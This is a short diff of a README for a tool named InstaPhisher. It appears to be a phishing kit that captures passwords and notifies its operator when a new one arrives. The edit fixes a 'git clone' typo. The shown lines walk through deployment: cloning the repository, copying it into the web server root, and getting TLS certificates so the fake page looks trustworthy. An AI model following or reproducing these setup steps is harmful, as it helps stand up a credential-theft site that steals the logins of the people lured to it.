@@ -25,12 +25,13 @@ You can also obtain SSL certificates with Let's Encrypt to benefit from an https
 
 The InstaPhisher file is used to notify you when a new password is captured. It is therefore not necessary to open it.
 
+
 # Install
 
 ### Linux
 
 ```
-git-clone https://github.com/ExilasP/InstaPhisher.git
+git clone https://github.com/ExilasP/InstaPhisher.git
 cd InstaPhisher
 cp * -r '/var/www/html'
 cd /var/www/html
